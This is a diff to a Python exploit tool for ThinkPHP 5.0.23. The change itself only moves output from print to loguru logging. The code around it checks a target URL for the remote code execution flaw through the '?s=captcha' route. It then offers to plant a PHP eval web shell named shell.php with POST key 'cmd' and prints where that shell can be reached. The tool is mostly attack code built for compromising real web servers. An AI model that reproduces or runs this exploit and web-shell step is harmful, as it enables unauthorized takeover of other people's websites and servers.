@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 # @Мартин.
 import sys,argparse,textwrap,requests
+from loguru import logger
 Version = "@Мартин. ThinkPHPV5.0.23 Tool V1.0.0"
 Title='''
 ************************************************************************************
@@ -28,6 +29,14 @@ Header = {
 'Content-Type': 'application/x-www-form-urlencoded'
 }
 
+def Init_Loger():
+    logger.remove()
+    logger.add(
+        sink=sys.stdout,
+        format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
+        level="INFO"
+    )
+
 
 class verification_Method():
     def __init__(self,args):
@@ -38,33 +47,32 @@ class verification_Method():
         if self.URL:
             self.verification_vulnerability()
         else:
-            print('[ERROR]You must fill in the -url parameter')
-
+            logger.error("You must fill in the -url parameter")
 
     def get_Web_Shell(self):
         if self.PAYLOAD('echo "<?php @eval(\$_POST[\'cmd\']);?>" >./shell.php;id') != 0:
-            print("[INFO]"+(self.URL).replace((self.URL).split('/')[-1],'')+"shell.php [Method POST Key:cmd]")
+            logger.info(f"[INFO]"+(self.URL).replace((self.URL).split('/')[-1],'')+"shell.php [Method POST Key:cmd]")
         else:
-            print("[ERROR]Uplaod Fail")
+            logger.error("Uplaod Fail")
 
 
     def verification_vulnerability(self,):
         if self.PAYLOAD() != self.PAYLOAD('id'):
-            print(f"[INFO]The {self.URL} has a ThinkPHP vulnerability")
+            logger.info(f"The {self.URL} has a ThinkPHP vulnerability")
             while True:
-                if input('[INFO]Try Get WebShell?(y/n)').lower() == 'y':
+                if input("Try Get WebShell?(y/n)").lower() == 'n':
+                    print('[INFO]Exit...')
+                else:
                     self.get_Web_Shell()
-                print('[INFO]Exit...')
                 sys.exit(1)
         else:
-            print(f"[WARING]The {self.URL} does not have ThinkPHP vulnerability")
-
+            logger.warning(f"The {self.URL} does not have ThinkPHP vulnerability")
 
     def PAYLOAD(self,Command=None):#记录首次访问页面大小
         try:
             INFO = requests.post(self.URL + '?s=captcha', headers=Header, data=POC.format(Command if Command else ''),timeout=3)
         except :
-            print("[WARING]The website cannot be accessed")
+            logger.warning("The website cannot be accessed")
             sys.exit(0)
         else:
             if INFO.status_code == 200:
@@ -75,6 +83,7 @@ class verification_Method():
 
 def main():
     print(Logo,"\n",Title)
+    Init_Loger()
     parser = argparse.ArgumentParser(
         formatter_class=argparse.RawTextHelpFormatter,
         epilog=textwrap.dedent('''
